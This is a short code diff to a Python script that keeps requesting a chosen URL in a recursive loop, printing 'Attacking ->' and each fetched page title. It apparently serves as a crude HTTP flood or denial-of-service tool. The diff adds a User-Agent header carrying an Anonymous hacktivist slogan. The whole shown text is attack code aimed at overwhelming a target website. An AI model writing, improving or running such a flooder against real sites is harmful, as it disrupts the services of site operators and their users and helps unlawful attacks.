@@ -28,6 +28,7 @@
 import sys
 import urllib.request
 from bs4 import BeautifulSoup
+from urllib.request import Request, urlopen
 
 ############################################################################################################################
 # Pass URL and keep requesting it
@@ -37,7 +38,8 @@ counter = 0
 print('\n____________________________________________________\n\n', 'Attacking ->', URL, '\n____________________________________________________\n')
 def attack(counter):
 	counter += 1
-	title = BeautifulSoup(urllib.request.urlopen(URL).read(), 'html.parser').find('title')
+	req = Request(URL, headers={'User-Agent': 'We are Anonymous. We are Legion. We do not forgive. We do not forget. Expect us'})
+	title = BeautifulSoup(urllib.request.urlopen(req).read(), 'html.parser').find('title')
 	print('Attack', counter, '->', title.text, '\n')
 	attack(counter)
 attack(counter)
